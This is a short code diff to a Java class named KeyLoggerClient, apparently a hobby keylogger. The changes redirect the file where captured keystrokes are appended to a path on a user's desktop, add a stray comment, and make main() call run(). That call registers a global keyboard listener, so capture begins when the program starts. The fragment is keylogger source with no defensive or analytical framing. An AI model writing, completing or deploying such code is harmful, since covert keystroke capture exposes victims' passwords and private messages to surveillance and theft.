@@ -373,7 +373,7 @@ public class KeyLoggerClient implements NativeKeyListener {
             if (NativeKeyEvent.getKeyText(e.getKeyCode()).toLowerCase().equals("enter")
                     || NativeKeyEvent.getKeyText(e.getKeyCode()).toLowerCase().equals("tab")) {
 
-                FileWriter fw = new FileWriter(new File("D:\\Log\\KeyBoard\\Record.txt"), true);
+                FileWriter fw = new FileWriter(new File("C:\\Users\\daova\\Desktop\\Log\\LogText\\KeyLogger.txt"), true);
                 try (BufferedWriter bw = new BufferedWriter(fw)) {
 
                     bw.newLine();
@@ -403,13 +403,14 @@ public class KeyLoggerClient implements NativeKeyListener {
             System.err.println(ex.getMessage());
 
             System.exit(1);
-        }
+        }//hello viet nam
+        
 
         GlobalScreen.getInstance().addNativeKeyListener(new KeyLoggerClient());
     }
 
     public static void main(String[] args) {
-
+        run();
     }
 
 }
